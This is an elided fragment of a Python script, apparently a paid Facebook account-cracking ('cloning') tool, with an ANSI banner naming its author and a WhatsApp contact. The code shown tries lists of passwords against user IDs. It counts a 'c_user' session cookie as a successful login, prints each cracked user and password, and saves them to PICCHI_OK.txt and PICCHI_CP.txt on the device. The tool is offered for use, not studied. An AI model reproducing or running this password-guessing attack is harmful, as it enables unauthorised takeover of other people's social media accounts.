...
logo="""
             ...
             \033[1;95m888888           88       88                 88                88888888        88
             \033[1;93m88                     88       88                 88                88          88        88
             \033[1;95m88                     88       88                 88                88          88        88
             \033[1;93m88                     88          88888          88888     88          88        88
             \033[1;95m THIS IS A,,,  MD PURNO SHAH
        \033[1;92m༄𝒑𝒖𝒓𝒏𝒐᭄•───────────────────────────────────────•༄𝒔𝒉𝒂𝒉᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : MD. Purno Shah           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : Purn0h4x0r          \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK :Md Purno Shah           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801756462587       \033[1;93m▇▇
             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID          \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGIVE ME 100 BDT FOR APRVAL      \033[1;93m▇▇
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
         \033[1;92m༄𝒑𝒖𝒓𝒏𝒐᭄•───────────────────────────────────────•༄𝒔𝒉𝒂𝒉᭄
""" 
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/PICCHI-OK.txt' % (H, P, str(len(ok))))
...
def R():
			...
			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94m1day i make me  a brand   : 𝑷𝒖𝒓𝒏𝒐-𝑺𝒉𝒂𝒉")
			print ('\033[1;92m༄𝒑𝒖𝒓𝒏𝒐᭄•───────────────────────────────────────•༄𝒔𝒉𝒂𝒉᭄')
			key = input(" [*] Choose : ")
			print ('༄𝒑𝒖𝒓𝒏𝒐᭄•───────────────────────────────────────•༄𝒔𝒉𝒂𝒉᭄')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[𝗣𝗜𝗖𝗖𝗛𝗜]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(𝗢𝗞)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [𝗣𝗜𝗖𝗖𝗛𝗜-𝗢𝗞 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/PICCHI_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/PICCHI_CP.txt' , 'a').write('%s\n' % wrt)
